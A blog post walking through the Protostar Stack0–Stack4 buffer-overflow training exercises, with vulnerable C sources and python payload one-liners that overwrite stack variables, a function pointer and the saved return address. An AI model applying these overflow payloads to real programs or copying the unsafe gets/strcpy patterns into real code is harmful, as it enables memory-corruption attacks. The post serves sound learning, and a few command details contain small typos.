---
layout: post
title:  "Protostar Exploit Exercises: Stacks Part One"
---

**Hello!** - I'm pretty new to hacking, and so far I've solved
some of the levels from the Exploit-Exercises "Nebula" series of
challenges. The Nebula challenges mainly deal with exploiting the UNIX shell &
programs that are running in it. So this is my first foray into
more advanced exploitation.

# [Stack0](https://exploit-exercises.com/protostar/stack0/)

>About
>
>This level introduces the concept that memory can be accessed
>outside of its allocated region, how the stack variables are laid
>out, and that modifying outside of the allocated memory can modify
>program execution.

Included in the first level's description is the source-code of the
program we're about to tear into.

{% highlight c %}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
{% endhighlight %}

This program reads from stdio into `buffer`. Both `buffer` and
`modified` are allocated on the stack, when we feed gets more than 64
characters, the `modified` variable changes, since `buffer`
overflowed into it.

~~~
$ python -c "print('@' * 64)" | /opt/protostar/bin/stack0
Try again?

$ python -c "print('@' * 65)" | /opt/protostar/bin/stack0
you have changed the 'modified' variable
~~~

* * *

# [Stack1](https://exploit-exercises.com/protostar/stack1/)

>##About
>
>This level looks at the concept of modifying variables to
>specific values in the program, and how the variables are laid out in
>memory.
>
> **Hints**
>
> + If you are unfamiliar with the hexadecimal being displayed, “man ascii” is your friend.
> + Protostar is little endian


In the source-code provided, the hexadecimal value 61626364 in ASCII
encodes to "abcd". Once again, the length of `buffer` is 64. So I used the
same way of overflowing the buffer as last time.

~~~
$ /opt/protostar/bin/stack1/ `python -c "print('0'*64+'abcd'')"`
Try again, you got 0x64636261
~~~

We're close, but as the hint said, protostar is little endian - meaning that
the least significant bit is stored first. So "abcd" is stored as 64636261 in memory.

~~~
hex   ascii |
64    d     |  abcd in little endian: 0x64636261
63    c     |  abcd in big endian:    0x61626364
62    b     |  dcba in little endian: 0x61626364
61    a     |  dcba in big endian:    0x64636261
~~~

I'll just flip things around & it should work =)

~~~
$ /opt/protostar/bin/stack1/ `python -c "print('0'*64+'dcba')"`
you have correctly got the variable to the right value
~~~

Yay!

* * *

#[Stack2](https://exploit-exercises.com/protostar/stack2/)

> ##About
>
> Stack2 looks at environment variables, and how they can be set.


{% highlight c %}
// ...
variable = getenv("GREENIE");

if(variable == NULL) {
    errx(1, "please set the GREENIE environment variable\n");
}

modified = 0;
strcpy(buffer, variable);
// ...
{% endhighlight %}

This time we need to set `modified` to 0x0d0a0d0a, which in ASCII
encodes to `\n\r\n\r`.

We accomplish this by using python & stuff.

~~~
$ GREENIE=`python -c "print('0'*64+'\n\r\n\r')"` /opt/protostar/bin/stack2
you have correctly modified the variable
~~~

* * *

# [stack3](https://exploit-exercises.com/protostar/stack3/)

>About
>
>Stack3 looks at environment variables, and how they can be set,
>and overwriting function pointers stored on the stack (as a prelude
>to overwriting the saved EIP)
>
>Hints
>
>+ both gdb and objdump is your friend you determining where the win() function lies in memory.

Using objdump I was able to determine the functions address, which
means we're Gucci. Giving the `--prefix-addresses` flag gives us the
location in memory where `win` is stored.

~~~
$ objdump --disassemble --prefix-addresses /opt/protostar/bin/stack3 | grep win
08048424 <win> push %ebp
...
$ python -c "print('0'*64+'\x24\x84\x04\x08')" | /opt/protostar/bin/stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
~~~

Holy shit it actually worked =)

* * * 

# [stack4](https://exploit-exercises.com/protostar/stack4/)

>Stack4 takes a look at overwriting saved EIP and standard buffer overflows.
>
>Hints
>
>+ A variety of introductory papers into buffer overflows may help.
>+ gdb lets you do “run < input”
>+ EIP is not directly after the end of buffer, compiler padding can also increase the size.
>

{% highlight c %}
void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
{% endhighlight %}


I started out by finding out the location in memory where the
win-function is stored, much like I did in stack3.

~~~
$ objdump --disassemble --prefix-addresses /opt/protostar/bin/stack4 | grep win
080483f4 <win> push % ebp
...
~~~

Now I started to give program input (`python -c "print('a'*
SOME_NUMBER +'\xf4\x83\x04\x08')" | /opt/protostar/bin/stack4`) &
observed what happened; If the program didnt crash - I made
`SOME_NUMBER` bigger. If the program did crash, I just lowered the
amount of leading `a`s.

I started on 64, tried 70 (no crash), tried 80 (crashed), and with
76 leading `a`s I was able to execute the win-function.

~~~
$ python -c "print('a'*76 + '\xf4\x83\x04\x08')" | /opt/protostar/bin/stack4
code flow sucessfully changed
Segmentation fault
~~~

I still got a segmentation fault though, well.. whatever :D

* * *

Thanks for reading.

**Useful stuff:**

+ [GDB cheatsheet](http://darkdust.net/files/GDB%20Cheat%20Sheet.pdf)
